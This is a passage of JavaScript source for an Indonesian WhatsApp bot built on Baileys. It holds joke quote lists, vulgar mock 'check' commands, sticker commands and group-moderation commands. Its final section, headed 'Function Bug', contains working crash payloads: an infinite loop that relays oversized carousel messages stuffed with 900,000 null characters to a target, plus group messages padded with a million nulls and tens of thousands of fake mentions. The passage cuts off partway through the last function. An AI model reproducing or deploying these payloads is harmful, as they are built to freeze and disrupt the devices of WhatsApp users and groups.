"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    ReplyXylent(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Hazazeltruth = bucin[Math.floor(Math.random() * bucin.length)]
	ReplyXylent(`${Hazazeltruth}`)
}
break
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  ReplyXylent(bacotan)
}
break
                
case "cekganteng": {
if (!args[0]) return ReplyXylent('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
ReplyXylent(teks)
}
break

case "cekcantik": {
if (!args[0]) return ReplyXylent('NAMA LU MANA??')
const cantik = [
"cuman 10% doang", 
"20% kurang cantik soal nya", 
"0% karna nggak cantik", 
"30% mayan cantikk", 
"40% cantik", 
"50% otw bikin cowo salting 😎", 
"60% orang cantik", 
"70% cantik bet", 
"80% cantikk parah", 
"90% cantik idaman cowo", 
"100% cantik bgt bjirr"
]
const hasil = cantik[Math.floor(Math.random() * cantik.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
ReplyXylent(teks)
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return ReplyXylent('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Kulkas 2 pintu",
"Kumis lele",
"Kumis Lele",
"Lemari dua Pintu",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  ReplyXylent(kodamn)
}
break

case "cekkontol": case "kontol": {
if (!q) return ReplyXylent(`Ketik Nama Yang Mau Di Cek.
Example : 
${prefix+command} depay`)

	const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
    `punya si ${q} ada sih tapi mode hemat energi 🗿`,
    `scan selesai... punya ${q} terdeteksi tapi ukuran nano`,
    `punya ${q} ada tapi lagi sembunyi jir 😹`,
    `punya ${q} offline dulu katanya malu`,
    `punya ${q} ketemu... tapi kecil bet anjir`,
    `punya ${q} hilang di semak semak`,
    `punya ${q} ada tapi lagi update sistem`,
    `punya ${q} lagi loading sabar bang`,
    `punya ${q} ketahuan tapi mini size 😭`,
    `punya ${q} ada tapi takut keluar`,
    `punya ${q} scan gagal... terlalu kecil buat dideteksi`,
    `punya ${q} ada tapi lagi AFK`,
    `punya ${q} ketemu tapi cuma trial version`,
]
const kodam = khodam[Math.floor(Math.random() * khodam.length)]

	const respons = `
 °「 *CEK KONTOL* 」°

 • *Nama :* ${q}
 • *Kontol :* ${kodam}
	  `
  
	ReplyXylent(respons)
  }
break
            case 's': 
            case 'sticker': 
            case 'stiker': {  
                
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await xylent.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return ReplyXylent(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nJika Media Yang Ingin Dijadikan Sticker Adalah Video, Batas Maksimal Durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await xylent.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    ReplyXylent(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break


case "kik":
case 'kick':
case "bye":
case "dor": {
    if (!m.isGroup) return ReplyXylent(mess.group)
    if (!m.quoted && !m.mentionedJid?.length && !text)
        return ReplyXylent("Reply / tag orang yang mau dikick")

    let users

    if (m.quoted) {
        users = m.quoted.sender
    } else if (m.mentionedJid.length > 0) {
        users = m.mentionedJid[0]
    } else {
        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    }

    try {
        await xylent.groupParticipantsUpdate(
            m.chat,
            [users],
            'remove'
        )

        ReplyXylent(`✅ Berhasil mengeluarkan @${users.split('@')[0]}`, {
            mentions: [users]
        })

    } catch (err) {
        console.log(err)
        ReplyXylent("❌ Gagal kick user")
    }
}
break

                
case "hidetag":
case "ht":
case "h": {
    if (!m.isGroup) return ReplyXylent(mess.group)
    if (!q && !m.quoted) return ReplyXylent(`Teksnya?`)

    if (m.quoted) {
        if (m.quoted.text || m.quoted.caption) {
            xylent.sendMessage(m.chat, {
                text: m.quoted.text || m.quoted.caption,
                mentions: participants.map(a => a.id)
            }, { quoted: qkontak })
        } else {
            xylent.sendMessage(m.chat, {
                forward: m.quoted.fakeObj,
                mentions: participants.map(a => a.id)
            })
        }
    }

    if (!m.quoted) {
        xylent.sendMessage(m.chat, {
            text: q ? q : '',
            mentions: participants.map(a => a.id)
        }, { quoted: qkontak })
    }
}
break

case "tagall": {
  if (!isGroup) return ReplyXylent(mess.group)
  if (!text) return ReplyXylent("pesannya")

  let teks = text + "\n\n"

  let groupMetadata
  try {
    groupMetadata = await xylent.groupMetadata(m.chat)
  } catch {
    return
  }

  let member = groupMetadata.participants
    .map(v => v.id)
    .filter(e => e !== botNumber && e !== m.sender)

  for (let e of member) {
    teks += `@${e.split("@")[0]}\n`
  }

  await xylent.sendMessage(
    m.chat,
    { text: teks, mentions: member },
    { quoted: m }
  )
}
break

case 'open':
case 'buka': {
    if (!m.isGroup) return ReplyXylent(mess.group)
    xylent.groupSettingUpdate(m.chat, 'not_announcement')
    ReplyXylent('✅ Grup berhasil dibuka')
}
break

case 'close':
case 'tutup': {
    if (!m.isGroup) return ReplyXylent(mess.group)
    xylent.groupSettingUpdate(m.chat, 'announcement')
    ReplyXylent('✅ Grup berhasil ditutup')
}
break

case 'qc': {
  if (!q) return ReplyXylent(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await xylent.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  xylent.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

// Function Bug
async function X7Nganceng(xylent, target, x) {
  var X71 = [];
  var X72 = Array.from({ length: 10000 }, () => ({}));

  var X73 = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 388944,
      height: 1600,
      width: 1200,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      caption: "XyzenX7",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: "999",
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
    hasMediaAttachment: true
  };

  for (var r = 0; r < 98; r++) {
    X71.push({
      header: X73,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          data: X72.length
        })
      }
    });
  }

  while (true) {
    var X74 = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "XyzenX7",
                format: "EXTENSION"
              },
              carouselMessage: {
                cards: X71,
                messageVersion: 1
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"AsepX7\",\"address\":\"AsepX7\",\"tower_number\":\"AsepX7\",\"city\":\"Japanese\",\"name\":\"AsepX7\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"AsepX7 | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
              },
              messageParamsJson: JSON.stringify({
                data: X71.length
              })
            }
          }
        }
      },
      {}
    );

    await xylent.relayMessage(
      target,
      X74.message,
      x
        ? {
            participant: { jid: target },
            messageId: X74.key.id
          }
        : {}
    );
  }
}

async function xgroupnulL(GroupJid) {
         await xylent.relayMessage(
                  GroupJid,
                  {
                           viewOnceMessage: {
                                    message: {
                                             interactiveResponseMessage: {
                                                      body: {
                                                               text: "tess",
                                                               format: "DEFAULT"
                                                      },
                                                      nativeFlowResponseMessage: {
                                                               name: "call_permission_request",
                                                               paramsJson: "\u0000".repeat(1000000),
                                                               version: 3
                                                      }
                                             },
                                             contextInfo: {
                                                      mentionedJid: [
                                                               ...Array.from(
                                                                        { length: 1950 },
                                                                        () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                                                               )
                                                      ]
                                             }
                                    }
                           }
                  },
                  {}
         );
}

async function groupInInvis(GroupJid) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                groupInviteMessage: {
                    groupJid: "X",
                    inviteCode: "X",
                    inviteExpiration: "X",
                    groupName: "\u0000".repeat(9999),
                    caption: "\u0000".repeat(9999),
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: GroupJid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(GroupJid, generateMessage, {});

    await xylent.relayMessage("status@broadcast", m.message, {
        messageId: msg.key.id,
        statusJidList: [GroupJid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: GroupJid
                    },
                    content: undefined
